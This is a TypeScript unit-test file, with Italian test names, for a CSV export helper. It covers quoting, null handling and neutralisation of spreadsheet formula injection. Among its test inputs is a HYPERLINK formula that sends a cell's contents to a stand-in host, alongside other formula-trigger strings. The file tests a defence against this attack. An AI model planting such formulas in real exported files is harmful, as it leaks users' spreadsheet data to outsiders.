import { describe, expect, it } from "vitest";
import { toCsv } from "./csv";

type Row = { id: number; name: string | null; active: boolean; note: string | null; createdAt: Date };

const columns = [
    { header: "ID", value: (row: Row) => row.id },
    { header: "Nome", value: (row: Row) => row.name },
    { header: "Attivo", value: (row: Row) => row.active },
    { header: "Note", value: (row: Row) => row.note },
    { header: "Creato il", value: (row: Row) => row.createdAt },
];

describe("toCsv", () => {
    it("scrive intestazione e righe separate da virgola, terminate da CRLF", () => {
        const csv = toCsv<Row>(
            [{ id: 1, name: "Mario", active: true, note: null, createdAt: new Date("2026-01-01T10:00:00.000Z") }],
            columns
        );

        expect(csv).toBe("﻿ID,Nome,Attivo,Note,Creato il\r\n1,Mario,Sì,,2026-01-01T10:00:00.000Z\r\n");
    });

    it("mette tra virgolette i campi con virgola, virgolette o a-capo, raddoppiando le virgolette interne", () => {
        const csv = toCsv<Row>(
            [
                {
                    id: 2,
                    name: 'Rossi, "il Mario"\nsecondo',
                    active: false,
                    note: null,
                    createdAt: new Date("2026-01-02T00:00:00.000Z"),
                },
            ],
            columns
        );

        expect(csv).toContain('"Rossi, ""il Mario""\nsecondo"');
        expect(csv).toContain(",No,");
    });

    it("un valore null o undefined diventa una cella vuota", () => {
        const csv = toCsv<Row>(
            [{ id: 3, name: null, active: true, note: null, createdAt: new Date("2026-01-03T00:00:00.000Z") }],
            columns
        );

        expect(csv.split("\r\n")[1]).toBe("3,,Sì,,2026-01-03T00:00:00.000Z");
    });

    it("senza righe scrive solo l'intestazione", () => {
        expect(toCsv<Row>([], columns)).toBe("﻿ID,Nome,Attivo,Note,Creato il\r\n");
    });
    describe("testi che un foglio di calcolo leggerebbe come formula", () => {
        const noteColumn = [{ header: "Note", value: (row: { note: string | number | null }) => row.note }];
        const cellOf = (note: string | number | null) => toCsv([{ note }], noteColumn).split("\r\n")[1];

        it.each(["=1+1", "+39 333 1234567", "-2+3", "@SUM(A1)", "\tcmd", "\r=1+1"])(
            "antepone un apostrofo a %j",
            (note) => {
                expect(cellOf(note).replace(/^"|"$/g, "")).toMatch(/^'/);
            }
        );

        it("neutralizza anche un campo che va tra virgolette", () => {
            expect(cellOf('=HYPERLINK("http://x.example/?d="&A2,"clic")')).toBe(
                '"\'=HYPERLINK(""http://x.example/?d=""&A2,""clic"")"'
            );
        });

        it.each(["-5.00", "+12", "42", "3.5"])("lascia intatto il numero scritto come testo %j", (note) => {
            expect(cellOf(note)).toBe(note);
        });

        it("lascia intatti i numeri veri e i testi che non iniziano con un carattere di formula", () => {
            expect(cellOf(-5)).toBe("-5");
            expect(cellOf("Mario = Rossi")).toBe("Mario = Rossi");
        });
    });
});
